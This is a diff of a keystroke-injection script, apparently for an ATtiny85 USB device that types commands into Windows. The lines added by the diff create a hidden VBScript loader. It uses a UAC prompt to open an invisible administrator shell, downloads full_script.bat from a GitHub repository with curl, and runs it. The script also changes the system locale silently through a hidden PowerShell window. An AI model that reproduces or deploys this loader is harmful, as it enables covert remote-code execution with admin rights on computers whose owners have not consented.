@@ -1,30 +1,32 @@
-
+@start
 @rem copy dash character to environment variable
-fn_run@@@@
+fn_run@@
 cmd
 key_enter@@@@
 cmd &c exit 45
-key_enter@@@@
+key_enter@
 setx DASH %)exitcodeAscii%
-key_enter@@@@
+key_enter@
 exit
-key_enter@@@@
+key_enter
 
 @rem change locale
-fn_run@@@@
+fn_run@@
 Powershell %DASH%Windowstzle Hidden Set%DASH%WinUserLanguageList %DASH%LanguageList en%DASH%US %DASH%force
 key_enter@@@@
-@rem wait 2s
 
-@rem ------------------------
-@rem ---- main code here ----
-@rem ------------------------
-
-@start
-fn_run@@@@
-cmd /k cd %temp%&echo|set /p="CreateObject("Shell.Application").ShellExecute "script.bat",,"","runas",1">script.vbs&echo|set /p="@echo off&set /p DUMMY=Hit ENTER to continue...">script.bat&script.vbs&exit
+@rem create an invisible admin shell fetching and running the full script
+fn_run@@
+cmd /k cd %temp%&copy con loader.vbs
 key_enter@@@@
-key_arrow_left@@@@
+CreateObject("Shell.Application").ShellExecute "cmd","/k curl -m 10 --retry 20 -o %temp%\script.bat https://raw.githubusercontent.com/8AC2BC7E026226F2856A9DA8C4033927/attiny85-injection/main/injection/full_script.bat&%temp%\script.bat","","runas",0
+key_enter
+fn_keyboard_interrupt@
+
+@rem launch the invisible shell and elevate it using uac
+loader.vbs&exit
+key_enter@@@@
+key_arrow_left
 key_enter
 
 @end
